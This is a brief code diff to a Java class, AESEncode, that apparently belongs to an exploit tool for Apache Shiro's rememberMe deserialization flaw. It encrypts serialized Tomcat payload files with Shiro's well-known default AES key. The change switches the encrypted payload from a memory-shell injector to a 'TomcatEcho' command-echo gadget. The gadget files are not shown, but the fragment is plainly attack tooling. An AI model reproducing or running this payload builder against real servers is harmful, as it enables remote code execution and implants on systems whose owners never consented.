@@ -12,10 +12,12 @@ public class AESEncode {
 
         String tomcatHeader = "./tomcatHeader.ser";
         String tomcatInject = "./tomcatInject.ser";
+        String tomcatEcho = "./TomcatEcho.ser";
+
 
         byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
         AesCipherService aes = new AesCipherService();
-        ByteSource ciphertext = aes.encrypt(getBytes(tomcatInject), key);
+        ByteSource ciphertext = aes.encrypt(getBytes(tomcatEcho), key);
         System.out.printf(ciphertext.toString());
     }
 
